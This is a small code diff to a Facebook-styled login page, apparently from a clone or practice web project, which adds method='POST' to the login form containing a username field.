@@ -2,7 +2,7 @@
   <main class="bg-blue-50 w-screen min-h-screen flex flex-col gap-6 justify-center items-center">
     <TextLogo custom="text-5xl" />
     <section class="border border-gray-300 flex flex-col gap-5 bg-white w-full md:w-100 shadow-lg p-5 rounded-lg">
-      <form class="flex flex-col gap-5">
+      <form class="flex flex-col gap-5" method="POST">
         <h2 class="text-xl text-center pb-2 text-slate-900">Log in to Facebook</h2>
         <!-- USERNAME -->
         <input type="text" name="username" required aria-required="true" aria-label="Enter your username" placeholder="Enter your username" autocomplete="username" autofocus class="form__input" />
